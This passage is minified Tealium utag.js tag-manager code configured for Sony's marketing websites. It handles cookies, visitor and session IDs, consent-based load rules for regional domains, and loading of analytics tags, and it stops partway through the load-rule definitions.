var utag_condload=!1;window.__tealium_twc_switch=!1;try{try{if(window.utag_cfg_ovrd=window.utag_cfg_ovrd||{},window.utag_cfg_ovrd.dom_complete=!0,window.utag_cfg_ovrd.noview=!0,window.utag_cfg_ovrd.gdprDLRef="configBRBanner",window.utag_data=window.utag_data||{},window.utag_data.configBRBanner="en",void 0===window.utag_data.website_platform&&(window.utag_data.website_platform="global:gwt"),!0===/((sony\.(at|ba|be|bg|ch|co\.il|co\.uk|com\.mk|com\.pl|com\.tr|cz|de|dk|ee|es|eu|fi|fr|gr|hr|hu|ie|it|kz|lt|lu|lv|net|nl|no|pl|pt|ro|rs|ru|se|si|sk|ua))|sony-europe\.com|sonystyle-europe\.com|sonylatvija\.com)/gi.test(window.location.hostname)&&"regional:marketing"===utag_data.website_platform)for(utag_data.regionalEUPage=!0,i=0;i<document.getElementsByTagName("script").length;i++)if(!0===/analyticsWithJQuery-/gi.test(document.getElementsByTagName("script")[i].src)){utag_data.regionalEUPage=!1;break}}catch(e){console.log(e)}}catch(e){console.log(e)}if(void 0===utag&&!utag_condload){var utag={id:"sony-marketing.cis",o:{},sender:{},send:{},rpt:{ts:{a:new Date}},dbi:[],db_log:[],loader:{q:[],lc:0,f:{},p:0,ol:0,wq:[],lq:[],bq:{},bk:{},rf:0,ri:0,rp:0,rq:[],ready_q:[],sendq:{pending:0},run_ready_q:function(){for(var e=0;e<utag.loader.ready_q.length;e++){utag.DB("READY_Q:"+e);try{utag.loader.ready_q[e]()}catch(e){utag.DB(e)}}},lh:function(e,t,a){return t=(e=""+location.hostname).split("."),a=/\.co\.|\.com\.|\.org\.|\.edu\.|\.net\.|\.asn\.|\...\.jp$/.test(e)?3:2,t.splice(t.length-a,a).join(".")},WQ:function(e,t,a,o,i){utag.DB("WQ:"+utag.loader.wq.length);try{utag.udoname&&utag.udoname.indexOf(".")<0&&utag.ut.merge(utag.data,window[utag.udoname],0),utag.cfg.load_rules_at_wait&&utag.handler.LR(utag.data)}catch(e){utag.DB(e)}for(o=0,i=[],e=0;e<utag.loader.wq.length;e++)(t=utag.loader.wq[e]).load=utag.loader.cfg[t.id].load,4==t.load?(this.f[t.id]=0,utag.loader.LOAD(t.id)):t.load>0?(i.push(t),o++):this.f[t.id]=1;for(e=0;e<i.length;e++)utag.loader.AS(i[e]);0==o&&utag.loader.END()},AS:function(e,t,a,o){utag.send[e.id]=e,void 0===e.src&&(e.src=utag.cfg.path+(void 0!==e.name?e.name:"utag."+e.id+".js")),e.src+=(e.src.indexOf("?")>0?"&":"?")+"utv="+(e.v?utag.cfg.template+e.v:utag.cfg.v),utag.rpt["l_"+e.id]=e.src,t=document,this.f[e.id]=0,2==e.load?(utag.DB("Attach sync: "+e.src),e.uid=e.id,t.write('<script id="utag_'+e.id+'" src="'+e.src+'"><\/script>'),void 0!==e.cb&&e.cb()):1!=e.load&&3!=e.load||t.createElement&&(a="utag_sony-marketing.cis_"+e.id,t.getElementById(a)||(o={src:e.src,id:a,uid:e.id,loc:e.loc},3==e.load&&(o.type="iframe"),void 0!==e.cb&&(o.cb=e.cb),utag.ut.loader(o)))},GV:function(e,t,a){for(a in t={},e)e.hasOwnProperty(a)&&"function"!=typeof e[a]&&(t[a]=e[a]);return t},OU:function(e,t,a,o,i,r,n,s){s={},utag.loader.RDcp(s);try{if(void 0!==s["cp.OPTOUTMULTI"])for(i=utag.loader.cfg,a=utag.ut.decode(s["cp.OPTOUTMULTI"]).split("|"),r=0;r<a.length;r++)if(1*(o=a[r].split(":"))[1]!=0)if(0==o[0].indexOf("c")){for(n in utag.loader.GV(i))if(i[n].tcat==o[0].substring(1)&&(i[n].load=0),i[n].tid==e&&i[n].tcat==o[0].substring(1))return!0;if(t==o[0].substring(1))return!0}else if(1*o[0]==0)utag.cfg.nocookie=!0;else{for(n in utag.loader.GV(i))i[n].tid==o[0]&&(i[n].load=0);if(e==o[0])return!0}}catch(e){utag.DB(e)}return!1},RDdom:function(e){var t=document||{},a=location||{};e["dom.referrer"]=t.referrer,e["dom.title"]=""+t.title,e["dom.domain"]=""+a.hostname,e["dom.query_string"]=(""+a.search).substring(1),e["dom.hash"]=(""+a.hash).substring(1),e["dom.url"]=""+t.URL,e["dom.pathname"]=""+a.pathname,e["dom.viewport_height"]=window.innerHeight||(t.documentElement?t.documentElement.clientHeight:960),e["dom.viewport_width"]=window.innerWidth||(t.documentElement?t.documentElement.clientWidth:960)},RDcp:function(e,t,a,o){for(o in t=utag.loader.RC())if(o.match(/utag_(.*)/))for(a in utag.loader.GV(t[o]))e["cp.utag_"+RegExp.$1+"_"+a]=t[o][a];for(a in utag.loader.GV(utag.cl&&!utag.cl._all_?utag.cl:t))a.indexOf("utag_")<0&&void 0!==t[a]&&(e["cp."+a]=t[a])},RDqp:function(e,t,a,o){if(t=location.search+(location.hash+"").replace("#","&"),utag.cfg.lowerqp&&(t=t.toLowerCase()),t.length>1)for(a=t.substring(1).split("&"),t=0;t<a.length;t++)(o=a[t].split("=")).length>1&&(e["qp."+o[0]]=utag.ut.decode(o[1]))},RDmeta:function(e,t,a,o){for(t=document.getElementsByTagName("meta"),a=0;a<t.length;a++){try{o=t[a].name||t[a].getAttribute("property")||""}catch(e){o="",utag.DB(e)}utag.cfg.lowermeta&&(o=o.toLowerCase()),""!=o&&(e["meta."+o]=t[a].content)}},RDva:function(e){var t=function(e,t){var a,o;(a=localStorage.getItem(t))&&"{}"!=a&&(o=utag.ut.flatten({va:JSON.parse(a)}),utag.ut.merge(e,o,1))};try{t(e,"tealium_va"),t(e,"tealium_va_"+e["ut.account"]+"_"+e["ut.profile"])}catch(e){utag.DB(e)}},RDut:function(e,t){var a={},o=new Date,i="function"==utag.ut.typeOf(o.toISOString);e["ut.domain"]=utag.cfg.domain,e["ut.version"]=utag.cfg.v,a.tealium_event=e["ut.event"]=t||"view",a.tealium_visitor_id=e["ut.visitor_id"]=e["cp.utag_main_v_id"],a.tealium_session_id=e["ut.session_id"]=e["cp.utag_main_ses_id"],a.tealium_session_number=e["cp.utag_main__sn"],a.tealium_session_event_number=e["cp.utag_main__se"];try{a.tealium_datasource=utag.cfg.datasource,a.tealium_account=e["ut.account"]=utag.cfg.utid.split("/")[0],a.tealium_profile=e["ut.profile"]=utag.cfg.utid.split("/")[1],a.tealium_environment=e["ut.env"]=utag.cfg.path.split("/")[6]}catch(e){utag.DB(e)}a.tealium_random=Math.random().toFixed(16).substring(2),a.tealium_library_name="utag.js",a.tealium_library_version=(utag.cfg.template+"0").substring(2),a.tealium_timestamp_epoch=Math.floor(o.getTime()/1e3),a.tealium_timestamp_utc=i?o.toISOString():"",o.setHours(o.getHours()-o.getTimezoneOffset()/60),a.tealium_timestamp_local=i?o.toISOString().replace("Z",""):"",utag.ut.merge(e,a,0)},RDses:function(e,t,a){a=(t=(new Date).getTime())+parseInt(utag.cfg.session_timeout)+"",e["cp.utag_main_ses_id"]?(e["cp.utag_main__ss"]="0",e["cp.utag_main__se"]=1+parseInt(e["cp.utag_main__se"]||0)+""):(e["cp.utag_main_ses_id"]=t+"",e["cp.utag_main__ss"]="1",e["cp.utag_main__se"]="1",e["cp.utag_main__sn"]=1+parseInt(e["cp.utag_main__sn"]||0)+""),e["cp.utag_main__pn"]=e["cp.utag_main__pn"]||"1",e["cp.utag_main__st"]=a,utag.loader.SC("utag_main",{_sn:e["cp.utag_main__sn"]||1,_se:e["cp.utag_main__se"],_ss:e["cp.utag_main__ss"],_st:a,ses_id:(e["cp.utag_main_ses_id"]||t)+";exp-session",_pn:e["cp.utag_main__pn"]+";exp-session"})},RDpv:function(e){"function"==typeof utag.pagevars&&(utag.DB("Read page variables"),utag.pagevars(e))},RD:function(e,t){utag.DB("utag.loader.RD"),utag.DB(e),utag.loader.RDcp(e),utag.loader.rd_flag||(utag.loader.rd_flag=1,e["cp.utag_main_v_id"]=e["cp.utag_main_v_id"]||utag.ut.vi((new Date).getTime()),e["cp.utag_main__pn"]=1+parseInt(e["cp.utag_main__pn"]||0)+"",utag.loader.SC("utag_main",{v_id:e["cp.utag_main_v_id"]}),utag.loader.RDses(e)),t&&!utag.cfg.noview&&utag.loader.RDses(e),utag.loader.RDqp(e),utag.loader.RDmeta(e),utag.loader.RDdom(e),utag.loader.RDut(e,t||"view"),utag.loader.RDpv(e),utag.loader.RDva(e)},RC:function(e,t,a,o,i,r,n,s,d,c,l,u,g,p,m,_,h,y,v,f,b,w){for(_={},a=""+document.cookie!=""?document.cookie.split("; "):[],f=/^(.*?)=(.*)$/,b=/^(.*);exp-(.*)$/,w=(new Date).getTime(),o=0;o<a.length;o++)if(a[o].match(f)&&(y=RegExp.$1,v=RegExp.$2),r=utag.ut.decode(v),void 0!==y)if(0==y.indexOf("ulog")||0==y.indexOf("utag_")){for(r=v.split("$"),s=[],l={},n=0;n<r.length;n++)try{if((s=r[n].split(":")).length>2&&(s[1]=s.slice(1).join(":")),h="",0==(""+s[1]).indexOf("~")){for(d=s[1].substring(1).split("|"),c=0;c<d.length;c++)d[c]=utag.ut.decode(d[c]);h=d}else h=utag.ut.decode(s[1]);l[s[0]]=h}catch(e){utag.DB(e)}for(n in _[y]={},utag.loader.GV(l)){if(l[n]instanceof Array){for(m=[],p=0;p<l[n].length;p++)l[n][p].match(b)&&(u="session"==RegExp.$2?void 0!==l._st?l._st:w-1:parseInt(RegExp.$2))>w&&(m[p]=0==t?l[n][p]:RegExp.$1);l[n]=m.join("|")}else l[n]=""+l[n],l[n].match(b)&&(u="session"==RegExp.$2?void 0!==l._st?l._st:w-1:parseInt(RegExp.$2),l[n]=u<w?null:0==t?l[n]:RegExp.$1);l[n]&&(_[y][n]=l[n])}}else(utag.cl[y]||utag.cl._all_)&&(_[y]=r);return e?_[e]?_[e]:{}:_},SC:function(e,t,a,o,i,r,n,s,d,c,l,u,g){if(!e)return 0;if("utag_main"==e&&utag.cfg.nocookie)return 0;g="";var p=new Date,m=new Date;if(m.setTime(p.getTime()+31536e6),u=m.toGMTString(),a&&"da"==a)u="Thu, 31 Dec 2009 00:00:00 GMT";else if(0!=e.indexOf("utag_")&&0!=e.indexOf("ulog"))"object"!=typeof t&&(g=t);else{for(i in o=utag.loader.RC(e,0),utag.loader.GV(t))if((r=""+t[i]).match(/^(.*);exp-(\d+)(\w)$/)&&(n=p.getTime()+parseInt(RegExp.$2)*("h"==RegExp.$3?36e5:864e5),"u"==RegExp.$3&&(n=parseInt(RegExp.$2)),r=RegExp.$1+";exp-"+n),"i"==a)null==o[i]&&(o[i]=r);else if("d"==a)delete o[i];else if("a"==a)o[i]=null!=o[i]?r-0+(o[i]-0):r;else if("ap"==a||"au"==a)if(null==o[i])o[i]=r;else{if(o[i].indexOf("|")>0&&(o[i]=o[i].split("|")),(n=o[i]instanceof Array?o[i]:[o[i]]).push(r),"au"==a){for(s={},l={},d=0;d<n.length;d++)n[d].match(/^(.*);exp-(.*)$/)&&(c=RegExp.$1),void 0===l[c]&&(l[c]=1,s[n[d]]=1);for(d in n=[],utag.loader.GV(s))n.push(d)}o[i]=n}else o[i]=r;for(n in s=new Array,utag.loader.GV(o))if(o[n]instanceof Array){for(a=0;a<o[n].length;a++)o[n][a]=encodeURIComponent(o[n][a]);s.push(n+":~"+o[n].join("|"))}else s.push((n+":").replace(/[\,\$\;\?]/g,"")+encodeURIComponent(o[n]));0==s.length&&(s.push(""),u=""),g=s.join("$")}return document.cookie=e+"="+g+";path=/;domain="+utag.cfg.domain+";expires="+u,1},LOAD:function(e,t,a,o){if(utag.loader.cfg)if(0!=this.ol){if(utag.DB("utag.loader.LOAD:"+e),0==this.f[e]){if(this.f[e]=1,1!=utag.cfg.noview&&utag.loader.cfg[e].send){utag.DB("SENDING: "+e);try{if(utag.loader.sendq.pending>0&&utag.loader.sendq[e])for(utag.DB("utag.loader.LOAD:sendq: "+e);o=utag.loader.sendq[e].shift();)utag.DB(o),utag.sender[e].send(o.event,utag.handler.C(o.data)),utag.loader.sendq.pending--;else utag.sender[e].send("view",utag.handler.C(utag.data));utag.rpt["s_"+e]=0}catch(t){utag.DB(t),utag.rpt["s_"+e]=1}}if(0==utag.loader.rf)return;for(t in utag.loader.GV(this.f))if(0==this.f[t]||2==this.f[t])return;utag.loader.END()}}else{for(t in utag.loader.cfg[e].block&&utag.loader.cfg[e].cbf&&(this.f[e]=1,delete utag.loader.bq[e]),utag.loader.GV(utag.loader.bq))return 4==utag.loader.cfg[e].load&&0==utag.loader.cfg[e].wait&&(utag.loader.bk[e]=1,utag.DB("blocked: "+e)),void utag.DB("blocking: "+t);utag.loader.INIT()}},EV:function(e,t,a,o){if("ready"==t){if(!utag.data)try{utag.cl={_all_:1},utag.loader.initdata(),utag.loader.RD(utag.data)}catch(e){utag.DB(e)}var i;if(document.attachEvent||utag.cfg.dom_complete?"complete"===document.readyState:"loading"!==document.readyState)setTimeout(a,1);else utag.loader.ready_q.push(a),utag.loader.ready_q.length<=1&&(document.addEventListener?(i=function(){document.removeEventListener("DOMContentLoaded",i,!1),utag.loader.run_ready_q()},utag.cfg.dom_complete||document.addEventListener("DOMContentLoaded",i,!1),window.addEventListener("load",utag.loader.run_ready_q,!1)):document.attachEvent&&(i=function(){"complete"===document.readyState&&(document.detachEvent("onreadystatechange",i),utag.loader.run_ready_q())},document.attachEvent("onreadystatechange",i),window.attachEvent("onload",utag.loader.run_ready_q)))}else e.addEventListener?e.addEventListener(t,a,!1):e.attachEvent&&e.attachEvent((1==o?"":"on")+t,a)},END:function(e,t,a,o,i,r){if(!this.ended){if(this.ended=1,utag.DB("loader.END"),e=utag.data,utag.handler.base&&"*"!=utag.handler.base)for(o=utag.handler.base.split(","),a=0;a<o.length;a++)void 0!==e[o[a]]&&(utag.handler.df[o[a]]=e[o[a]]);else"*"==utag.handler.base&&utag.ut.merge(utag.handler.df,e,1);for(var n in utag.rpt.r_0="t",utag.loader.GV(utag.cond))utag.rpt["r_"+n]=utag.cond[n]?"t":"f";utag.rpt.ts.s=new Date,(i=utag.cfg.path).indexOf(".tiqcdn.")>0&&1==e["cp.utag_main__ss"]&&!utag.cfg.no_session_count&&utag.ut.loader({src:i.substring(0,i.indexOf("/utag/")+6)+"tiqapp/utag.v.js?a="+utag.cfg.utid+(utag.cfg.nocookie?"&nocookie=1":"&cb="+(new Date).getTime()),id:"tiqapp"}),1!=utag.cfg.noview&&utag.handler.RE("view",e,"end"),utag.handler.INIT()}}},DB:function(e,t){if(!1!==utag.cfg.utagdb&&(void 0===utag.cfg.utagdb&&(t=document.cookie+"",utag.cfg.utagdb=t.indexOf("utagdb=true")>=0),!0===utag.cfg.utagdb)){var a;a="object"==utag.ut.typeOf(e)?utag.handler.C(e):e,utag.db_log.push(a);try{utag.cfg.noconsole||console.log(a)}catch(e){}}},RP:function(e,t,a){if(void 0!==e&&void 0!==e.src&&""!=e.src){for(a in t=[],utag.loader.GV(e))"src"!=a&&t.push(a+"="+escape(e[a]));this.dbi.push((new Image).src=e.src+"?utv="+utag.cfg.v+"&utid="+utag.cfg.utid+"&"+t.join("&"))}},view:function(e,t,a){return this.track({event:"view",data:e||{},cfg:{cb:t,uids:a}})},link:function(e,t,a){return this.track({event:"link",data:e||{},cfg:{cb:t,uids:a}})},track:function(e,t,a,o,i){for(i in"string"==typeof(e=e||{})&&(e={event:e,data:t||{},cfg:{cb:a,uids:o}}),utag.loader.GV(utag.o))utag.o[i].handler.trigger(e.event||"view",e.data||e,e.cfg||{cb:t,uids:a});return e.cfg=e.cfg||{cb:t},"function"==typeof e.cfg.cb&&e.cfg.cb(),!0},handler:{base:"",df:{},o:{},send:{},iflag:0,INIT:function(e,t,a){if(utag.DB("utag.handler.INIT"),utag.initcatch)utag.initcatch=0;else if(this.iflag=1,(e=utag.loader.q.length)>0)for(utag.DB("Loader queue"),t=0;t<e;t++)a=utag.loader.q[t],utag.handler.trigger(a.a,a.b,a.c)},test:function(){return 1},LR:function(e){for(var t in utag.DB("Load Rules"),utag.loader.GV(utag.cond))utag.cond[t]=!1;for(var a in utag.DB(e),utag.loader.loadrules(e),utag.DB(utag.cond),utag.loader.initcfg(),utag.loader.OU(),utag.loader.GV(utag.cond))utag.rpt["r_"+a]=utag.cond[a]?"t":"f"},RE:function(e,t,a,o,i,r,n){if("alr"!=a&&!this.cfg_extend)return 0;if(utag.DB("RE: "+a),"alr"==a&&utag.DB("All Tags EXTENSIONS"),utag.DB(t),void 0!==this.extend){for(n=0,o=0;o<this.extend.length;o++)try{i=0,void 0!==this.cfg_extend&&(void 0===(r=this.cfg_extend[o]).count&&(r.count=0),0==r[e]||1==r.once&&r.count>0||0==r[a]?i=1:(1==r[a]&&(n=1),r.count++)),1!=i&&(this.extend[o](e,t),utag.rpt["ex_"+o]=0)}catch(e){utag.DB(e),utag.rpt["ex_"+o]=1,utag.ut.error({e:e.message,s:utag.cfg.path+"utag.js",l:o,t:"ge"})}return utag.DB(t),n}},trigger:function(e,t,a,o,i,r){if(utag.DB("trigger:"+e+(a&&a.uids?":"+a.uids.join(","):"")),t=t||{},utag.DB(t),this.iflag){if(utag.ut.merge(t,this.df,0),utag.loader.RD(t,e),utag.cfg.noview=!1,a&&a.uids)for(this.RE(e,t,"alr"),r=0;r<a.uids.length;r++)o=a.uids[r],utag.loader.OU(utag.loader.cfg[o].tid)||n(e,t,o);else if(utag.cfg.load_rules_ajax)for(this.RE(e,t,"blr"),this.LR(t),this.RE(e,t,"alr"),r=0;r<utag.loader.cfgsort.length;r++)o=utag.loader.cfgsort[r],utag.loader.cfg[o].load&&utag.loader.cfg[o].send&&n(e,t,o);else for(o in this.RE(e,t,"alr"),utag.loader.GV(utag.sender))n(e,t,o);this.RE(e,t,"end")}else{for(o in utag.DB("trigger:called before tags loaded"),utag.loader.f)1!==utag.loader.f[o]&&utag.DB("Tag "+o+" did not LOAD");utag.loader.q.push({a:e,b:utag.handler.C(t),c:a})}function n(e,t,a){try{void 0!==utag.sender[a]?(utag.DB("SENDING: "+a),utag.sender[a].send(e,utag.handler.C(t)),utag.rpt["s_"+a]=0):2!=utag.loader.cfg[a].load&&(utag.loader.sendq[a]=utag.loader.sendq[a]||[],utag.loader.sendq[a].push({event:e,data:utag.handler.C(t)}),utag.loader.sendq.pending++,utag.loader.AS({id:a,load:1}))}catch(e){utag.DB(e)}}},C:function(e,t,a){for(a in t={},utag.loader.GV(e))e[a]instanceof Array?t[a]=e[a].slice(0):t[a]=e[a];return t}},ut:{pad:function(e,t,a,o){if(o="",t>(e=""+(e-0).toString(16)).length)for(a=0;a<t-e.length;a++)o+="0";return""+o+e},vi:function(e,t,a){if(!utag.v_id){t=this.pad(e,12),a=""+Math.random(),t+=this.pad(a.substring(2,a.length),16);try{t+=this.pad(navigator.plugins.length?navigator.plugins.length:0,2),t+=this.pad(navigator.userAgent.length,3),t+=this.pad(document.URL.length,4),t+=this.pad(navigator.appVersion.length,3),t+=this.pad(screen.width+screen.height+parseInt(screen.colorDepth?screen.colorDepth:screen.pixelDepth),5)}catch(e){utag.DB(e),t+="12345"}utag.v_id=t}return utag.v_id},hasOwn:function(e,t){return null!=e&&Object.prototype.hasOwnProperty.call(e,t)},isEmptyObject:function(e,t){for(t in e)if(utag.ut.hasOwn(e,t))return!1;return!0},isEmpty:function(e){var t=utag.ut.typeOf(e);return"number"==t?isNaN(e):"boolean"!=t&&("string"==t?0===e.length:utag.ut.isEmptyObject(e))},typeOf:function(e){return{}.toString.call(e).match(/\s([a-zA-Z]+)/)[1].toLowerCase()},flatten:function(e){var t={};return function e(a,o){if(Object(a)!==a||a instanceof Array)t[o]=a;else if(utag.ut.isEmptyObject(a));else for(var i in a)e(a[i],o?o+"."+i:i)}(e,""),t},merge:function(e,t,a,o){if(a)for(o in utag.loader.GV(t))e[o]=t[o];else for(o in utag.loader.GV(t))void 0===e[o]&&(e[o]=t[o])},decode:function(e,t){t="";try{t=decodeURIComponent(e)}catch(e){utag.DB(e)}return""==t&&(t=unescape(e)),t},encode:function(e,t){t="";try{t=encodeURIComponent(e)}catch(e){utag.DB(e)}return""==t&&(t=escape(e)),t},error:function(e,t,a){"undefined"!=typeof utag_err&&utag_err.push(e)},loader:function(e,t,a,o,i,r){for(i in utag.DB(e),t=document,"iframe"==e.type?((r=t.getElementById(e.id))&&"IFRAME"==r.tagName&&r.parentNode.removeChild(r),a=t.createElement("iframe"),e.attrs=e.attrs||{},utag.ut.merge(e.attrs,{height:"1",width:"1",style:"display:none"},0)):"img"==e.type?(utag.DB("Attach img: "+e.src),a=new Image):((a=t.createElement("script")).language="javascript",a.type="text/javascript",a.async=1,a.charset="utf-8"),e.id&&(a.id=e.id),utag.loader.GV(e.attrs))a.setAttribute(i,e.attrs[i]);a.setAttribute("src",e.src),"function"==typeof e.cb&&(a.addEventListener?a.addEventListener("load",(function(){e.cb()}),!1):a.onreadystatechange=function(){"complete"!=this.readyState&&"loaded"!=this.readyState||(this.onreadystatechange=null,e.cb())}),"function"==typeof e.error&&utag.loader.EV(a,"error",e.error),"img"!=e.type&&(i=e.loc||"head",(o=t.getElementsByTagName(i)[0])&&(utag.DB("Attach to "+i+": "+e.src),"script"==i?o.parentNode.insertBefore(a,o):o.appendChild(a)))}}};if(utag.o["sony-marketing.cis"]=utag,utag.cfg={template:"ut4.46.",load_rules_ajax:!0,load_rules_at_wait:!1,lowerqp:!1,noconsole:!1,session_timeout:18e5,readywait:0,noload:0,domain:utag.loader.lh(),datasource:"##UTDATASOURCE##".replace("##UTDATASOURCE##",""),path:"//tags.tiqcdn.com/utag/sony-marketing/cis/prod/",utid:"sony-marketing/cis/202207041539"},utag.cfg.v=utag.cfg.template+"202207041539",utag.cond={116:0,117:0,118:0,119:0,120:0,121:0,122:0,124:0,126:0,127:0,128:0,130:0,131:0,134:0,135:0,136:0,149:0,150:0,151:0,152:0,153:0,154:0,156:0,157:0,160:0,161:0,18:0,19:0,20:0,21:0,22:0,23:0,24:0,25:0,26:0,27:0,28:0,29:0,30:0,31:0,32:0,33:0,34:0,35:0,36:0,37:0,38:0,39:0,40:0,41:0,42:0,43:0,44:0,45:0,46:0,49:0,50:0,51:0,52:0,53:0,54:0,55:0,57:0,63:0,64:0,66:0,67:0,68:0,69:0,70:0,72:0,73:0,74:0,75:0,76:0,77:0,78:0,9:0},utag.loader.initdata=function(){try{utag.data="undefined"!=typeof utag_data?utag_data:{},utag.udoname="utag_data"}catch(e){utag.data={},utag.DB("idf:"+e)}},utag.loader.loadrules=function(e,t){var a=e||utag.data,o=t||utag.cond;for(var i in utag.loader.GV(o))switch(i){case"116":try{o[116]|=/^(www(\.kz)?\.sony((-(asia|africa|europe|latin|mea))|latvija|style-europe)?\.)/.test(a["dom.domain"])&&"gwtConsentGiven"==a.cs_event_name&&/(all|performance|userlocal)/.test(a.cs_consent_categories)&&/(global:gw(t|x)|regional:ecommerce)/.test(a.website_platform)||/^((store\.sony\.(co\.th|(com\.(sg|my|vn|ar|mx|co|pe|ec|pa|br))|cl|ru))|www\.thesonyshop\.ca)$/.test(a["dom.domain"])&&"regional:ecommerce"==a.website_platform&&"gwtConsentGiven"==a.cs_event_name&&/(all|performance)/.test(a.cs_consent_categories)||/^(electronics\.sony\.com)$/.test(a["dom.domain"])&&/^(\/(tv-video|audio)\/(tv-video-home-theater-sound-bars|boomboxes-radio|headphones|audio-components)\/(soundbars|all-boomboxes-radio|all-headphones|hi-res-audio)\/p\/(saz9r|cfds70blk|whl600-b))$/.test(a["dom.pathname"])&&"gwtConsentGiven"==a.cs_event_name&&a.cs_consent_categories.toString().indexOf("C0002")>-1}catch(e){utag.DB(e)}break;case"117":try{o[117]|=/(\.sony\.((com\.(sg|ph|hk|my|vn))|(co\.(th|id|in))))$/.test(a["dom.domain"])}catch(e){utag.DB(e)}break;case"118":try{o[118]|=/((sony\.(at|be|bg|co\.uk|cz|de|dk|ee|es|eu|fi|fr|gr|hr|hu|ie|it|lt|lu|lv|nl|no|pl|pt|ro|ru|se|si|sk|ba|ch|com\.mk|com\.tr|kz|net|rs|ru|ua))|sony-europe\.com|sonystyle-europe\.com|sonylatvija\.com)/.test(a["dom.domain"])&&/[^\/(search|support|electronics\/support)].*/.test(a["dom.pathname"])&&"gwtConsentGiven"==a.cs_event_name&&/(all|performance|bazaarvoice)/.test(a.cs_consent_categories)}catch(e){utag.DB(e)}break;case"119":try{o[119]|=/(\.sony\.(ca|com)|sony.registriastaging.com)$/.test(a["dom.domain"])&&/[^\/(...|)(asia|middle-east|ae|ao|bf|bh|bj|cg|ci|cm|dz|eg|et|ga|gh|iq|jo|ke|kw|lb|lr|ly|ma|mu|ng|om|pk|qa|sa|sn|sy|tn|tz|ug|ye|za)](|\/?|\/.*)$/.test(a["dom.pathname"])&&"regional:ecommerce"!=a.website_platform}catch(e){utag.DB(e)}break;case"120":try{o[120]|=/(\.sony\.((com\.(pe|pa|mx|ec|co|ar|gt))|cl))$/.test(a["dom.domain"])&&"gwtConsentGiven"==a.cs_event_name&&/(all|performance)/.test(a.cs_consent_categories)}catch(e){utag.DB(e)}break;case"121":try{o[121]|=/(\.(sony-africa|sony-asia|sony-mea)\.com)$/.test(a["dom.domain"])}catch(e){utag.DB(e)}break;case"122":try{o[122]|=/((sony\.(at|be|bg|co\.uk|cz|de|dk|ee|es|eu|fi|fr|gr|hr|hu|ie|it|lt|lu|lv|nl|no|pl|pt|ro|se|si|sk|ba|ch|com\.mk|com\.pl|com\.tr|net|rs|co\.il))|sony-europe\.com|sonystyle-europe\.com|sonylatvija\.com)/.test(a["dom.domain"])&&"gwtConsentGiven"==a.cs_event_name&&/(all|advertising|google-adwords)/.test(a.cs_consent_categories)&&/(all|advertising|google-adsense)/.test(a.cs_consent_categories)&&!/^search/i.test(a["dom.pathname"])&&!/^support/i.test(a["dom.pathname"])&&!/^electronics\/support/i.test(a["dom.pathname"])&&/^(global:gw(t|x))$/.test(a.website_platform)}catch(e){utag.DB(e)}break;case"124":try{o[124]|=/(((sony)\.(com\.ar|cl|com\.co|com\.mx|com\.pa|com\.br|co\.cr|com\.bo|com\.do|com\.ec|com\.sv|com\.gt|com\.hn|com\.py|com\.pe|com\.pr|com\.ve|com\.ni)|sony-latin\.com|sonypr\.com)|m8agency\.com|syndication\-sola\.com|alphauniverse-latin\.com)$/gi.test(a["dom.domain"])&&"gwtConsentGiven"==a.cs_event_name&&/(all|performance)/.test(a.cs_consent_categories)&&/^(global:gw(t|x))$/.test(a.website_platform)}catch(e){utag.DB(e)}break;case"126":try{o[126]|=/^((www|preview\-production\-pdp)\.sony(.+)?\..+)$/gi.test(a["dom.domain"])&&/^((\/.+)?\/(electronics|all-electronics)(\/?|(\/.+\/?)*))$/.test(a["dom.pathname"])&&"gwtConsentGiven"==a.cs_event_name&&/(all|performance|google-analytics)/gi.test(a.cs_consent_categories)&&/(all|advertising|doubleclick)/gi.test(a.cs_consent_categories)}catch(e){utag.DB(e)}break;case"127":try{o[127]|=/(\.sony\.(ca|com))$/.test(a["dom.domain"])&&/[^\/(...|)(asia|middle-east|ae|ao|bf|bh|bj|cg|ci|cm|dz|eg|et|ga|gh|iq|jo|ke|kw|lb|lr|ly|ma|mu|ng|om|pk|qa|sa|sn|sy|tn|tz|ug|ye|za)](|\/?|\/.*)$/.test(a["dom.pathname"])&&"regional:ecommerce"!=a.website_platform}catch(e){utag.DB(e)}break;case"128":try{o[128]|=/(\.sony\.(com\.ph|com\.my|com\.sg|co\.th))$/.test(a["dom.domain"])||/(\.sony-asia\.com)$/.test(a["dom.domain"])}catch(e){utag.DB(e)}break;case"130":try{o[130]|=/^(www\.sony\.com\.vn)$/.test(a["dom.domain"])&&/^(\/electronics\/.*\/buy\/?)$/.test(a["dom.pathname"])}catch(e){utag.DB(e)}break;case"131":try{o[131]|=/^(www\.kz\.sony\.ru)$/.test(a["dom.domain"])}catch(e){utag.DB(e)}break;case"134":try{o[134]|=/^(www\.sony\.ca)$/.test(a["dom.domain"])&&/^(\/(en|fr)\/electronics\/.*\/buy\/?)$/.test(a["dom.pathname"])}catch(e){utag.DB(e)}break;case"135":try{o[135]|=/^(.*\.sony\.(com\.(au|sg|my|vn|br|ph)|co\.(in|nz|kr)))$/.test(a["dom.domain"])&&/^(\/electronics\/support\/?)/gi.test(a["dom.pathname"])||/^(.*\.sony-latin\.com)$/gi.test(a["dom.domain"])&&/^(\/(es|en)\/electronics\/support\/?)/gi.test(a["dom.pathname"])||/^((stg\.)?web\.sony-asia\.com)$/gi.test(a["dom.domain"])&&/^(\/(au|in|nz|my|sg|vn|ph|id|ap|tw|en-th|th|ar-xm|en-xm)\/contact-us\/?)$/gi.test(a["dom.pathname"])||/^.*\.sony\.com$/.test(a["dom.domain"])&&/^\/electronics\/support\/?/gi.test(a["dom.pathname"])&&"gwtConsentGiven"==a.cs_event_name&&/(all|C0003)/gi.test(a.cs_consent_categories)||/^.*\.sony\.ca$/gi.test(a["dom.domain"])&&/^\/en\/electronics\/support\/?/gi.test(a["dom.pathname"])||/^(.*\.(sony|sonylatvija)\.(at|ba|be|bg|ch|cz|de|dk|es|ee|fi|fr|gr|hr|hu|ie|it|lt|lu|com|com\.mk|nl|no|pl|pt|ro|rs|sk|si|se|com\.tr|co\.uk|eu))$/gi.test(a["dom.domain"])&&/^((\/(de|fr|nl|en))?\/electronics\/support\/?)/gi.test(a["dom.pathname"])&&"gwtConsentGiven"==a.cs_event_name&&/(all|support)/gi.test(a.cs_consent_categories)||/^(.*\.sony\.(ru|kz|ua))$/gi.test(a["dom.domain"])&&/^(\/electronics\/support\/?)/gi.test(a["dom.pathname"])||/^(.*\.sony\.co\.(th|id))$/gi.test(a["dom.domain"])&&/^(\/..\/electronics\/support\/?)/gi.test(a["dom.pathname"])||/^.*\.sony\.co\.kr$/gi.test(a["dom.domain"])&&/^